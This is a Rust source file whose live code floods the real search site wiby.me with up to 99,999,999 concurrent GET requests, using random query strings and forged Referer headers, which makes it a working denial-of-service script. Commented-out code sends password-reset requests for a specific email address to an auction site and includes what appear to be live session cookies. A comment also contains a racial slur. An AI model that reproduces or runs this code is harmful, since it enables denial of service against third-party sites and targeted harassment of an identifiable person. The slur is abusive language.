// extern crate reqwest;
use reqwest::header;


// fn main() -> Result<(), Box<dyn std::error::Error>> {
//     let mut headers = header::HeaderMap::new();
//     headers.insert("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36".parse().unwrap());
//     headers.insert("x-requested-with", "XMLHttpRequest".parse().unwrap());

//     let client = reqwest::blocking::Client::builder()
//         .redirect(reqwest::redirect::Policy::none())
//         .build()
//         .unwrap();
//     let res = client.get("https://matsart.bidspirit.com/api/users/profile/password/sendPasswordReset.api?email=orikeshet866%40gmail.com&sessionType=BIDDER&lang=he&localId=Bidder_7EGmWQaxN6gMFjE53L9N-9EHCKyUovM4&_=1703244140527")
//         .headers(headers)
//         .send()?
//         .text()?;
//     println!("{}", res);

//     Ok(())
// }

use reqwest::blocking::Client;
use rayon::prelude::*;
use rand::Rng;
use std::iter;

fn generate(len: usize) -> String {
    const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut rng = rand::thread_rng();
    let one_char = || CHARSET[rng.gen_range(0..CHARSET.len())] as char;
    iter::repeat_with(one_char).take(len).collect()
}
fn main() {
    // Create a Reqwest client
    let client = Client::new();

    // Number of requests to send
    let num_requests = 99999999;

    // Maximum number of concurrent workers
    let max_workers = 20000;

    // println!("niggers! {}", generate(30))
    // Use Rayon to parallelize the requests
    (0..num_requests)
        .into_par_iter()
        .with_max_len(max_workers)
        .for_each(|_| {
            fetch_url(client.clone());
        });
}

fn fetch_url(client: Client) {
    // Use Result type to handle errors
    let mut headers = header::HeaderMap::new();
    headers.insert("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36".parse().unwrap());
    headers.insert("x-requested-with", "XMLHttpRequest".parse().unwrap());
    headers.insert("Cache-Control", "no-cache".parse().unwrap());

    let referer :&str=  "http://";
    let com :&str=  "com";
    let rnd_str :&str= &generate(30);
    let together = format!("{referer}{rnd_str}.{com}");
    let pre_url = "https://wiby.me/?q=";
    let url :&str= &format!("{pre_url}{rnd_str}");
    // let url :&str = &concat_url;
    // println!("{}", together);
    // let new_referer = ".com";
    // let borrowed_string: &str = ".com";


    headers.insert("Referer", together.parse().unwrap());
    headers.insert("Connection", "keep-alive".parse().unwrap());
    headers.insert("Keep-Alive", "99999".parse().unwrap());
    // headers.carinsert("accept", "application/json, text/plain, */*".parse().unwrap());
    // headers.insert("accept-language", "en,he-IL;q=0.9,he;q=0.8,en-US;q=0.7".parse().unwrap());
    // headers.insert("bidspirit-arg-local-id", "avNzyXUIm9L3OXSD4eKFXbXhT4XKz9h1".parse().unwrap());
    // headers.insert("cache-control", "no-cache".parse().unwrap());
    // headers.insert(header::COOKIE, "JSESSIONID=664A2C91EDD5D1D510AF2A75944041D9; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Dec+22+2023+13%3A55%3A28+GMT%2B0200+(Israel+Standard+Time)&version=6.33.0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A0%2CC0004%3A0&AwaitingReconsent=false; PortalLogin=jcFGTQAGSepoqyylxbokzhwcdYo7Oc3Y".parse().unwrap());
    // headers.insert("pragma", "no-cache".parse().unwrap());
    // headers.insert("referer", "https://il.bidspirit.com/ui/auth/warning?lang=he".parse().unwrap());
    // headers.insert("sec-ch-ua", "\"Google Chrome\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"".parse().unwrap());
    // headers.insert("sec-ch-ua-mobile", "?0".parse().unwrap());
    // headers.insert("sec-ch-ua-platform", "\"Linux\"".parse().unwrap());
    // headers.insert("sec-fetch-dest", "empty".parse().unwrap());
    // headers.insert("sec-fetch-mode", "cors".parse().unwrap());
    // headers.insert("sec-fetch-site", "same-origin".parse().unwrap());
    // headers.insert("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36".parse().unwrap());

    
    match client.get(url)
            .headers(headers)
            .send() {
        Ok(response) => {
            // Handle successful response
            println!("{}", response.status());

            // match response.text() {
            //     Ok(body) => {
            //         println!("Body: {}", body);
            //     }
            //     Err(error) => {
            //         eprintln!("Error reading response body: {}", error);
            //     }
            // }
        
        }
        Err(error) => {
            // Handle error
            eprintln!("Error fetching {}: {}", url, error);
        }
    }
}
